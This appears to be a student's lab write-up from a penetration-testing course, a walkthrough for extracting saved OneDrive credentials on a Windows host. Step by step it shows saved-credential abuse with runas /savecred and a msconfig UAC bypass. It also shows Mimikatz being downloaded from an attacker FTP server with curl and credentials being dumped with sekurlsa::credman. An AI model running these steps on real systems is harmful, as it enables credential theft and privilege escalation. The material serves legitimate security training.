# [[Attacking Windows Credential Manager]] | [[Windows File Transfer Methods]] | [[FTP Uploads]]

1. **What is the password mcharles uses for OneDrive?**
`xfreerdp3 /u:sadams /p:totally2brow2harmon@ /v:10.129.234.171`

`cmdkey /list`
![[Pasted image 20260508121616.png]]

```cmd
runas /savecred /user:SRV01\\mcharles cmd  
whoami
```
![[Pasted image 20260508121630.png]]

`cmdkey /list`
![[Pasted image 20260508121642.png]]
Mimikatz requires high privileges, so we need to get administrator. We performed a User Account Control (UAC) bypass using the `msconfig` utility:
`msconfig UAC bypass`
![[Pasted image 20260508121711.png]]
![[Pasted image 20260508121721.png]]
```cmd
cd C:\\Users\\Administrator  
dir
```
![[Pasted image 20260508121736.png]]
```shell
cd /usr/share/windows-resources/mimikatz/x64  
sudo python3 -m pyftpdlib --port 21
```

```cmd
curl --output mimikatz.exe ftp://<Attacker PC ip address>/mimikatz.exe  
dir
```
![[Pasted image 20260508121804.png]]
`mimikatz.exe`
![[Pasted image 20260508121812.png]]
The following commands were used:

- `privilege::debug` — attempts to enable the debug privilege (SeDebugPrivilege) for the current process so it can interact with and read other processes (e.g., lsass.exe).
- `sekurlsa::credman` — a Mimikatz module that targets credentials stored by the Windows Credential Manager (and related LSASS secrets), attempting to enumerate them.

```cmd
privilege::debug  
sekurlsa::credman
```
![[Pasted image 20260508121835.png]]